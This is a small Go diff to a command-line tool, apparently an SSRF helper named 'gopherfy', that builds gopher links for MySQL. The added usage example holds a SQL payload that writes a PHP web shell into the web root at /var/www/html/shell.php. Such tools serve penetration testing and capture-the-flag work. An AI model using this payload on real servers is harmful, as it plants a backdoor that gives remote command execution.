@@ -21,6 +21,7 @@ func newMySQLCmd(encoder *string) *cobra.Command {
 	cmd := &cobra.Command{
 		Use:           "mysql",
 		Short:         "Generate mysql gopher link",
+		Example:       `gopherfy mysql -q "SELECT '<?php system(\$$_REQUEST[\'cmd\']); ?>' INTO OUTFILE '/var/www/html/shell.php'"`,
 		SilenceUsage:  true,
 		SilenceErrors: true,
 		RunE: func(cmd *cobra.Command, args []string) error {
